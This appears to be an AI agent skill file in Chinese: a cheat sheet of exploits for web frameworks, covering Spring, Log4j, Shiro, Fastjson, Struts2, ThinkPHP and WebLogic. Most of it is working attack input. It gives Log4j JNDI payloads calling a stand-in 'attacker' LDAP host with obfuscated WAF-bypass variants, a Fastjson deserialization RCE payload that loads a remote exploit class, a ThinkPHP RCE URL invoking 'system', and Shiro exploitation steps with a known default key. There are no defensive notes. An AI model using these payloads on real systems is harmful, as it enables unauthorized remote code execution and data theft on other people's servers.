---
name: 框架安全测试
description: Use when encountering 主流框架漏洞 - spring/log4j/shiro/fastjson/struts2/thinkphp
---

# 框架安全测试

## Info

- **Domain**: web
- **Tags**: web, framework

# 框架漏洞速查

## Spring系列

| 漏洞 | 组件 | 利用方式 |
|------|------|----------|
| Spring4Shell | spring-beans | 参数绑定写Shell |
| SpEL注入 | spring-expression | 表达式执行 |
| Actuator | spring-boot-actuator | /actuator/env泄露 |

**Actuator端点**:
- `/actuator/env` 环境变量
- `/actuator/heapdump` 内存dump
- `/actuator/loggers` 日志配置

---

## Log4j (CVE-2021-44228)

**JNDI注入**: `${jndi:ldap://attacker/a}`

**绕过WAF**:
- `${${::-j}${::-n}${::-d}${::-i}:ldap://...}`
- `${${lower:j}ndi:${lower:l}dap://...}`
- `${jndi:rmi://...}`

**利用链**: LDAP/RMI返回恶意class

---

## Shiro反序列化

**RememberMe Cookie**: AES加密的序列化对象

**利用步骤**:
1. 获取常见密钥或爆破
2. ysoserial生成payload
3. AES加密 → Base64 → RememberMe

**常见密钥**: kPH+bIxk5D2deZiIxcaaaA== 等

---

## Fastjson

**反序列化RCE**:
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}
```

**利用链**: JdbcRowSetImpl/TemplatesImpl

---

## Struts2

**OGNL表达式注入**:
- S2-045: Content-Type头
- S2-046: Content-Disposition头
- S2-057: URL路径

**工具**: Struts2-Scan

---

## ThinkPHP

**5.x RCE**: `?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id`

**路由**: think\app/invokefunction调用任意函数

---

## WebLogic

**XMLDecoder**: `/wls-wsat/CoordinatorPortType`
**T3协议**: 反序列化
**IIOP**: 反序列化

---

## 工具

- **ysoserial**: Java反序列化payload生成
- **JNDIExploit**: JNDI注入服务器
- **ShiroAttack**: Shiro密钥爆破
- **Struts2-Scan**: Struts2漏洞扫描